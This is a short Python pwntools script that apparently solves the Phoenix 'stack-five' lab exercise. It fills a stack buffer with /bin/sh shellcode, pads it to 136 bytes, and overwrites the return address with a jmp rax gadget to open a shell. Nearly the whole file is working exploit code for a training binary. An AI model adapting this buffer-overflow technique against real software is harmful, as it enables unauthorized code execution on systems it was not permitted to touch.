# Buffer overflow shellcode execution

# This exercise aims at filling shellcode into the buffer, then calling
# /bin/sh

# There's 128+8 chars in space, so it's not a ton of room. we can
# execute a shell though

import binascii
import pwn

filepath = '/opt/phoenix/amd64/stack-five'
pwn.context.arch = 'amd64'

opened_file = pwn.ELF(filepath)


# I'll use the shellcode from shellcraft.sh(), but I'll use a jmp rax instruction from the binary
# so I'm able to go directly into my shell start with nops.

# root@kitty:~# ROPgadget --binary /opt/phoenix/amd64/stack-five --only "jmp"
# Gadgets information
# ============================================================
# 0x0000000000400481 : jmp rax
#
# Unique gadgets found: 1

# Prepare shellcode to execve /bin/sh
shell = pwn.shellcraft.sh()
payload = pwn.asm(shell)

# Prepare padding
payload += 'A'*(136-len(payload))

# Jump to our jmp rax
return_addr = binascii.unhexlify('0000000000400481')[::-1]
payload = payload + return_addr

proc = opened_file.process()
pwn.log.info(proc.recvline().decode('utf-8'))

proc.sendline(payload)
proc.interactive()
exit()
